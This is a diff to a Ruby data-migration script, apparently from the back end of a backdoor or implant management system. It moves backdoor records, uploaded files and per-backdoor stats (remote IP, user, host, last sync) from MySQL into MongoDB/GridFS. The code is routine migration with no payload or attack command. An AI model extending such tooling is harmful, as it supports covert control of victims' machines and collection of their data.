@@ -32,7 +32,7 @@ class BackdoorMigration
       
       mb.build = backdoor[:build]
       
-      mb.instance = backdoor[:instance] if kind == 'backdoor'
+      mb.instance = backdoor[:instance].downcase if kind == 'backdoor'
       mb.version = backdoor[:version] if kind == 'backdoor'
       
       mb.logkey = backdoor[:logkey]
@@ -119,14 +119,13 @@ class BackdoorMigration
     
     print "Migrating uploads "
 
-    uplodas = DB.instance.mysql_query('SELECT * from `upload` ORDER BY `upload_id`;').to_a
-    uplodas.each do |up|
+    stats = DB.instance.mysql_query('SELECT * from `upload` ORDER BY `upload_id`;').to_a
+    stats.each do |up|
       backdoor = Item.where({_mid: up[:backdoor_id], _kind: 'backdoor'}).first
       begin
         upload = backdoor.upload_requests.create!(filename: up[:filename])
-        upload[:_grid] = [ GridFS.instance.put(upload[:_id].to_s, up[:content]) ]
+        upload[:_grid] = [ GridFS.instance.put(up[:content], {filename: up[:filename]}) ]
         upload.save
-        #puts GridFS.instance.get_by_filename(upload[:_id].to_s).inspect
       rescue Mongoid::Errors::Validations => e
         next
       end
@@ -134,6 +133,31 @@ class BackdoorMigration
       print "." unless verbose
     end
     
+    puts " done."
+
+    # stats
+    
+    print "Migrating stats "
+
+    stats= DB.instance.mysql_query('SELECT * from `stat` ORDER BY `backdoor_id`;').to_a
+    stats.each do |st|
+      backdoor = Item.where({_mid: st[:backdoor_id], _kind: 'backdoor'}).first
+
+      next unless backdoor.stat.nil?
+
+      print "." unless verbose
+
+      ms = ::Stat.new
+      ms.source = st[:remoteip]
+      ms.user = st[:remoteuser]
+      ms.device = st[:remotehost]
+      ms.last_sync = Time.at(st[:received]).getutc unless st[:received].nil?
+
+      backdoor.stat = ms
+
+      backdoor.save
+    end
+
     puts " done."
 
   end
